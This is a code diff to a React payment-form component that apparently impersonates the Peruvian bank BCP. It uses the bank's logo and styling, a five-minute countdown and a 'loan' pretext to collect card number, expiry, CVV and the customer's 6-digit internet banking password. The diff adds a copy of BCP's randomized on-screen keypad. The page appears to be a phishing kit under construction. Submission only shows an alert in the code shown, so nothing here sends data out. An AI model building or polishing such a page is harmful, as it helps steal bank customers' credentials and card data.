@@ -1,7 +1,7 @@
 // app/prestamo/tarjeta/TarjetaClient.tsx
 "use client";
 
-import { useEffect, useState } from "react";
+import { useEffect, useRef, useState } from "react";
 
 export default function TarjetaClient({
   amount,
@@ -14,18 +14,83 @@ export default function TarjetaClient({
   docType: string;
   docNumber: string;
 }) {
+  // Header: contador 300s
   const [seconds, setSeconds] = useState(300);
   useEffect(() => {
     const t = setInterval(() => setSeconds((s) => Math.max(0, s - 1)), 1000);
     return () => clearInterval(t);
   }, []);
 
+  // Form
   const [card, setCard] = useState("");
   const [exp, setExp] = useState("");
   const [cvv, setCvv] = useState("");
   const [remember, setRemember] = useState(false);
   const [clave, setClave] = useState("");
 
+  // ====== KEYPAD estilo BCP (3x4, números random) ======
+  const [padOpen, setPadOpen] = useState(false);
+  const [padCells, setPadCells] = useState<Array<number | "trash" | "close">>(
+    []
+  );
+  const padRef = useRef<HTMLDivElement>(null);
+  const claveWrapRef = useRef<HTMLDivElement>(null);
+
+  const shuffle = (arr: number[]) => {
+    const a = [...arr];
+    for (let i = a.length - 1; i > 0; i--) {
+      const j = Math.floor(Math.random() * (i + 1));
+      [a[i], a[j]] = [a[j], a[i]];
+    }
+    return a;
+  };
+
+  const buildPad = () => {
+    // 12 celdas (3 filas x 4 cols). Reservamos:
+    // idx 8 = 🗑️ (trash)  |  idx 11 = ✕ (close).
+    const layout: Array<number | "trash" | "close"> = new Array(12).fill(null) as any;
+    layout[8]  = "trash";
+    layout[11] = "close";
+
+    // posiciones disponibles para 10 dígitos (0-9)
+    const slots = [0,1,2,3,4,5,6,7,9,10];
+    const digits = shuffle([0,1,2,3,4,5,6,7,8,9]);
+    digits.forEach((d, i) => { layout[slots[i]] = d; });
+
+    setPadCells(layout);
+  };
+
+  const openPad = () => {
+    buildPad();
+    setPadOpen(true);
+  };
+  const closePad = () => setPadOpen(false);
+
+  // Cerrar por click fuera
+  useEffect(() => {
+    if (!padOpen) return;
+    const onDown = (e: MouseEvent) => {
+      const pad = padRef.current;
+      const wrap = claveWrapRef.current;
+      if (!pad || !wrap) return;
+      const target = e.target as Node;
+      if (!pad.contains(target) && !wrap.contains(target)) closePad();
+    };
+    document.addEventListener("mousedown", onDown);
+    return () => document.removeEventListener("mousedown", onDown);
+  }, [padOpen]);
+
+  // Auto-cerrar al llegar a 6 dígitos
+  useEffect(() => {
+    if (clave.length === 6) closePad();
+  }, [clave]);
+
+  const pressDigit = (d: number) => {
+    setClave((prev) => (prev.length >= 6 ? prev : prev + String(d)));
+  };
+  const clearAll = () => setClave("");
+
+  // Helpers de formato
   const formatCard = (v: string) =>
     v.replace(/\D/g, "").slice(0, 16).replace(/(\d{4})(?=\d)/g, "$1 ").trim();
 
@@ -42,11 +107,13 @@ export default function TarjetaClient({
     if (!/^(0[1-9]|1[0-2])\/\d{2}$/.test(exp)) return;
     if (!/^\d{3}$/.test(cvv)) return;
     if (!/^\d{6}$/.test(clave)) return;
+
     alert("Continuará…");
   };
 
   return (
     <div className="min-h-screen bg-white">
+      {/* Header azul con logo y segundero */}
       <header className="bg-[color:var(--brand)] text-white">
         <div className="container-max h-12 flex items-center justify-between">
           <img src="/bcp-logo.svg" alt="BCP" className="h-5" />
@@ -88,7 +155,7 @@ export default function TarjetaClient({
               Recordar datos
             </label>
 
-            {/* Fecha de vencimiento + CVV con el MISMO estilo “label chip” */}
+            {/* Fecha de vencimiento + CVV con label chip */}
             <div className="grid grid-cols-2 gap-3">
               <div className="field-bcp">
                 <span className="field-bcp__label">Fecha de vencimiento</span>
@@ -114,18 +181,75 @@ export default function TarjetaClient({
               </div>
             </div>
 
-            {/* Clave de internet (6 dígitos) */}
-            <div className="field-bcp">
+            {/* Clave (6 dígitos) con keypad */}
+            <div className="field-bcp relative" ref={claveWrapRef}>
               <span className="field-bcp__label">Clave de internet de 6 dígitos</span>
               <input
                 className="input-bcp w-full"
-                inputMode="numeric"
                 type="password"
+                inputMode="none"        // evita teclado nativo
+                readOnly                // forzamos keypad
                 value={clave}
-                onChange={(e) =>
-                  setClave(e.target.value.replace(/\D/g, "").slice(0, 6))
-                }
+                onFocus={openPad}
+                onClick={openPad}
               />
+
+              {/* Keypad BCP */}
+              {padOpen && (
+                <div
+                  ref={padRef}
+                  className="keypad-bcp absolute left-0 right-0 mt-2 z-50"
+                >
+                  <div className="grid grid-cols-4 gap-2">
+                    {padCells.map((cell, i) => {
+                      if (cell === "trash") {
+                        return (
+                          <button
+                            key={"trash"}
+                            type="button"
+                            onClick={clearAll}
+                            className="keypad-bcp__btn keypad-bcp__btn--icon"
+                            aria-label="Limpiar"
+                          >
+                            {/* icono papelera */}
+                            <svg width="18" height="18" viewBox="0 0 24 24" className="keypad-bcp__icon" aria-hidden>
+                              <path d="M3 6h18M8 6V4h8v2m-1 3v10a2 2 0 0 1-2 2H9a2 2 0 0 1-2-2V9m4 3v6m4-6v6" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round"/>
+                            </svg>
+                          </button>
+                        );
+                      }
+                      if (cell === "close") {
+                        return (
+                          <button
+                            key={"close"}
+                            type="button"
+                            onClick={closePad}
+                            className="keypad-bcp__btn keypad-bcp__btn--icon"
+                            aria-label="Cerrar"
+                          >
+                            {/* icono X */}
+                            <svg width="18" height="18" viewBox="0 0 24 24" className="keypad-bcp__icon" aria-hidden>
+                              <path d="M6 6l12 12M18 6l-12 12" stroke="currentColor" strokeWidth="2" strokeLinecap="round"/>
+                            </svg>
+                          </button>
+                        );
+                      }
+                      // dígitos
+                      return (
+                        <button
+                          key={String(cell)}
+                          type="button"
+                          onClick={() => pressDigit(cell as number)}
+                          className="keypad-bcp__btn"
+                          disabled={clave.length >= 6}
+                        >
+                          {cell}
+                        </button>
+                      );
+                    })}
+                  </div>
+                </div>
+              )}
             </div>
 
             <button type="submit" className="btn-bcp">Continuar</button>
